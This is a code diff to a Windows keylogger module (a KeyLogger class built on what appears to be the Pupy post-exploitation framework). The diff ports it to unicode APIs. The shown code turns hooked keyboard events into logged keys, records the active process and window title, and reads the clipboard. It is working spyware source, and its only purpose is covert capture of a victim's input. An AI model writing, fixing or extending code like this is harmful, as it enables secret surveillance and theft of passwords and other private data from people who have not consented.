@@ -250,14 +250,14 @@ class KeyLogger(pupy.Task):
             try:
                 hooked_key = chr(kbdllhookstruct.vkCode)
             except:
-                hooked_key = "0x%s"%kbdllhookstruct.vkCode
+                hooked_key = '0x%s'%kbdllhookstruct.vkCode
         else:
-            hooked_key = buff.value.encode('utf8')
+            hooked_key = buff.value
 
         if specialKey:
             hooked_key = specialKey
 
-        exe, win_title = "unknown", "unknown"
+        exe, win_title = 'unknown', 'unknown'
         try:
             exe, win_title = get_current_process()
         except Exception:
@@ -265,13 +265,12 @@ class KeyLogger(pupy.Task):
 
         if self.last_windows!=(exe, win_title):
             self.append(
-                '\n%s: %s %s\n'%(
+                u'\n{}: {} {}\n'.format(
                     datetime.datetime.now(),
-                    str(exe).encode('string_escape'),
-                    str(win_title).encode('string_escape')))
+                    exe, win_title))
             self.last_windows=(exe, win_title)
 
-        paste=""
+        paste=''
 
         try:
             paste = winGetClipboard()
@@ -297,12 +296,12 @@ def get_current_process():
 
     #process_id = "%d" % pid.value
 
-    executable = create_string_buffer('\x00' * 512)
+    executable = create_unicode_buffer('\x00', 512)
     h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
-    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
+    psapi.GetModuleBaseNameW(h_process, None, byref(executable), 512)
 
-    window_title = create_string_buffer('\x00' * 512)
-    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
+    window_title = create_unicode_buffer('\x00', 512)
+    length = user32.GetWindowTextW(hwnd, byref(window_title),512)
 
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
